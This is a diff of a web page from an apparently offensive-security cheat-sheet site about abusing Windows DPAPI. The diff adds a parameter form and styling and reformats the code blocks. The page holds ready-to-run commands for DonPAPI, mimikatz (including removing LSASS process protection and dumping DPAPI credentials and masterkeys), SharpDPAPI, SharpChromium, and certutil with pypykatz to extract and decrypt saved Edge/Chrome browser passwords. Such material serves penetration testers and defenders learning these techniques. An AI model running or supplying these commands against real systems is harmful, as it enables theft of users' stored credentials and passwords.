@@ -197,15 +197,138 @@
   <li><a href="https://tldrbins.github.io/@donpapi/">DonPAPI</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="abuse-1-auto-dump-from-linux">Abuse #1: Auto dump (From Linux)</h3>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">DonPAPI collect -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; -t &lt;TARGET&gt;
-</span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a></em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &#39;&lt;PASSWORD&gt;&#39; -t &lt;TARGET&gt;
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a></em></small></p>
 </div></div></p>
 <h3 id="abuse-1-auto-dump-from-windows">Abuse #1: Auto dump (From Windows)</h3>
 <p>
@@ -215,20 +338,20 @@
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&#34;dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect&#34;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c &#34;dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect&#34;
+</span></span></span></code></pre></div></div>
 <h4 id="2-secrets-dump">2. Secrets Dump</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;token::elevate&#34;</span> <span class="s2">&#34;!+&#34;</span> <span class="s2">&#34;!processprotect /process:lsass.exe /remove&#34;</span> <span class="s2">&#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;</span><span class="s1">&#39; &#39;</span><span class="s2">&#34;dpapi::masterkey /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;PROTECT_HASH&gt; /sid:&lt;SID&gt; /password:&lt;PASSWORD&gt; /protected&#34;</span><span class="s1">&#39; &#39;</span><span class="s2">&#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;</span><span class="err">&#39;</span> <span class="s2">&#34;exit&#34;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mimikatz.exe &#34;token::elevate&#34; &#34;!+&#34; &#34;!processprotect /process:lsass.exe /remove&#34; &#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;&#39; &#39;&#34;dpapi::masterkey /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;PROTECT_HASH&gt; /sid:&lt;SID&gt; /password:&lt;PASSWORD&gt; /protected&#34;&#39; &#39;&#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;&#39; &#34;exit&#34;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run as system</span>
-</span></span><span class="line"><span class="cl">.<span class="se">\S</span>harpDPAPI.exe machinetriage
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run as user</span>
-</span></span><span class="line"><span class="cl">.<span class="se">\S</span>harpDPAPI.exe credentials /password:&lt;PASSWORD&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as system
+</span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe machinetriage
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as user
+</span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe credentials /password:&#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div></div>
 </div></p>
 <br>
 <hr>
@@ -239,43 +362,43 @@
 <button data-tabset="set3" data-tabcontent="tab2" >Manual</button>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">SharpChromium</span><span class="p">.</span><span class="py">exe</span> <span class="n">logins</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpChromium.exe logins
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe">SharpChromium.exe</a></em></small></p></div>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><h4 id="1-prepare-logindata-and-localstate-file">1. Prepare logindata and localstate file</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get Local State json file, copy and paste to local Linux</span>
-</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="s2">&#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Local State&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get Login Data binary file</span>
-</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-encode</span> <span class="s2">&#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Default\Login Data&#34;</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">logindata</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Copy and paste to local Linux</span>
-</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">logindata</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Base64 decode</span>
-</span></span><span class="line"><span class="cl">cat logindata_b64 <span class="p">|</span> base64 -d &gt; logindata
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Extract key from local state</span>
-</span></span><span class="line"><span class="cl">cat localstate <span class="p">|</span> jq -r .os_crypt.encrypted_key <span class="p">|</span> base64 -d <span class="p">|</span> cut -c6- &gt; blob
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Local State json file, copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type &#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Local State&#34;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get Login Data binary file
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\appdata\local\microsoft\edge\User Data\Default\Login Data&#34; C:\ProgramData\logindata
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\logindata
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
+</span></span><span class="line"><span class="cl"><span class="go">cat logindata_b64 | base64 -d &gt; logindata
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Extract key from <span class="nb">local</span> state
+</span></span><span class="line"><span class="cl"><span class="go">cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- &gt; blob
+</span></span></span></code></pre></div></div>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get masterkey_guid</span>
-</span></span><span class="line"><span class="cl">pypykatz dpapi describe blob blob
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get masterkey_guid
+</span></span><span class="line"><span class="cl"><span class="go">pypykatz dpapi describe blob blob
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/skelsec/pypykatz">pypykatz</a></em></small></p>
 <h4 id="2-retrieve-keys">2. Retrieve Keys</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get master key</span>
-</span></span><span class="line"><span class="cl"><span class="n">certutil</span> <span class="n">-encode</span> <span class="s2">&#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt;&#34;</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\&lt;</span><span class="n">MASTERKEY_GUID</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Copy and paste to local Linux</span>
-</span></span><span class="line"><span class="cl"><span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\&lt;</span><span class="n">MASTERKEY_GUID</span><span class="p">&gt;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Base64 decode</span>
-</span></span><span class="line"><span class="cl">cat masterkey_guid_b64 <span class="p">|</span> base64 -d &gt; masterkey_guid
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Get master key
+</span></span><span class="line"><span class="cl"><span class="go">certutil -encode &#34;C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt;&#34; C:\ProgramData\&lt;MASTERKEY_GUID&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste to <span class="nb">local</span> Linux
+</span></span><span class="line"><span class="cl"><span class="go">type C:\ProgramData\&lt;MASTERKEY_GUID&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
+</span></span><span class="line"><span class="cl"><span class="go">cat masterkey_guid_b64 | base64 -d &gt; masterkey_guid
+</span></span></span></code></pre></div></div>
 <h4 id="3-decrypt">3. Decrypt</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pypykatz dpapi prekey password &lt;SID&gt; &lt;USER_PASSWORD&gt; <span class="p">|</span> tee pkf
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pypykatz dpapi masterkey &lt;MASTERKEY_GUID_FILE&gt; pkf -o mkf
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pypykatz dpapi chrome --logindata logindata mkf localstate
-</span></span></code></pre></div></div></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password &lt;SID&gt; &lt;USER_PASSWORD&gt; | tee pkf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey &lt;MASTERKEY_GUID_FILE&gt; pkf -o mkf
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi chrome --logindata logindata mkf localstate
+</span></span></span></code></pre></div></div></div></p>
 <br>
 <hr>
 <h3 id="abuse-3-decrpyt-masterkey-without-password">Abuse #3: Decrpyt Masterkey without password</h3>
@@ -283,13 +406,14 @@
 <button data-tabset="set4" data-tabcontent="tab1" class="active">Windows</button>
 
 <div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Take note: Last key</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;dpapi::masterkey /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /rpc&#34;</span> <span class="n">exit</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Decrypt</span>
-</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s2">&#34;dpapi::cred /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /masterkey:&lt;KEY&gt;&#34;</span> <span class="n">exit</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Take note: Last key
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::masterkey /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /rpc&#34; exit
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Decrypt
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::cred /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /masterkey:&lt;KEY&gt;&#34; exit
+</span></span></span></code></pre></div></div>
 </div></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
